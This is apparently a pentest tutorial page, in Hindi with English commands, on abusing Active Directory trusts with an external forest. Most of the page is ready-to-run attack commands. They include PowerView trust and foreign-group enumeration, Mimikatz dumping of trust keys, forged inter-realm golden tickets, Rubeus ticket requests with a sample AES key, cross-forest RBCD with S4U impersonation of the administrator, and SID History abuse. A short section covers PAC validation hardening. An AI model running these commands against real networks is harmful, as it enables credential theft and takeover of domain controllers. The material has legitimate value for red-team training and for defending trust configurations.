# बाहरी Forest Domain - OneWay (Inbound) या bidirectional

{{#include ../../banners/hacktricks-training.md}}

इस scenario में कोई बाहरी domain आप पर trust कर रहा है (या दोनों एक-दूसरे पर trust कर रहे हैं), इसलिए आपको उस पर किसी प्रकार का access मिल सकता है।

## Enumeration

सबसे पहले, आपको **trust** को **enumerate** करना होगा:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` आपको तुरंत यह देखने देते हैं कि cross-forest abuse paths (RBCD, SIDHistory) के अतिरिक्त prerequisites के बिना काम करने की संभावना है या नहीं।<sup>[[2]](#references)</sup>

पिछली enumeration में पाया गया कि user **`crossuser`** **`External Admins`** group के अंदर है, जिसके पास **Admin access** external domain के **DC** के अंदर है।

## Initial Access

यदि आप दूसरे domain में अपने user का कोई **special** access **नहीं** ढूंढ पाए, तो भी आप AD Methodology पर वापस जाकर **unprivileged user से privesc** करने का प्रयास कर सकते हैं (उदाहरण के लिए kerberoasting जैसी चीज़ें):

आप `-Domain` param का उपयोग करके **Powerview functions** से **दूसरे domain** को इस तरह **enumerate** कर सकते हैं:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### लॉग इन करना

External domain तक access रखने वाले users के credentials का उपयोग करके regular method से आपको access करने में सक्षम होना चाहिए:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

आप [**SID History**](sid-history-injection.md) का भी forest trust के across abuse कर सकते हैं।

यदि कोई user **एक forest से दूसरे forest में migrate** किया जाता है और **SID Filtering enabled नहीं है**, तो **दूसरे forest से एक SID add करना** संभव हो जाता है, और authentication **trust के across** होने पर यह **SID**, **user के token** में **add** कर दिया जाएगा।

> [!WARNING]
> याद रखें, आप signing key इस प्रकार प्राप्त कर सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

आप **trusted** key से **current domain के user का impersonation करने वाला TGT sign** कर सकते हैं।
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### उपयोगकर्ता का पूर्ण रूप से प्रतिरूपण करने का तरीका
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD जब आप trusting forest में किसी machine account को नियंत्रित करते हैं (no SID filtering / selective auth)

यदि आपका foreign principal (FSP) आपको trusting forest में computer objects पर write करने वाले किसी group (जैसे, `Account Operators`, custom provisioning group) में शामिल कर देता है, तो आप उस forest के किसी target host पर **Resource-Based Constrained Delegation** configure कर सकते हैं और वहाँ किसी भी user का impersonate कर सकते हैं:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
यह केवल तब काम करता है जब **SelectiveAuthentication disabled** हो और **SID filtering** आपके controlling SID को strip न करे। यह एक तेज़ lateral path है जो SIDHistory forging से बचता है और trust reviews में अक्सर छूट जाता है।<sup>[[2]](#references)</sup>

### PAC validation hardening

**CVE-2024-26248**/**CVE-2024-29056** के लिए PAC signature validation updates inter-forest tickets पर signing enforcement जोड़ते हैं। **Compatibility mode** में, forged inter-realm PAC/SIDHistory/S4U paths अभी भी unpatched DCs पर काम कर सकते हैं। **Enforcement mode** में, forest trust से होकर जाने वाला unsigned या tampered PAC data अस्वीकार कर दिया जाता है, जब तक आपके पास target forest trust key भी न हो। Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) उपलब्ध रहने तक इसे कमजोर कर सकते हैं।<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – CVE-2024-26248 और CVE-2024-29056 के लिए PAC validation changes](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC spec – SID filtering और claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
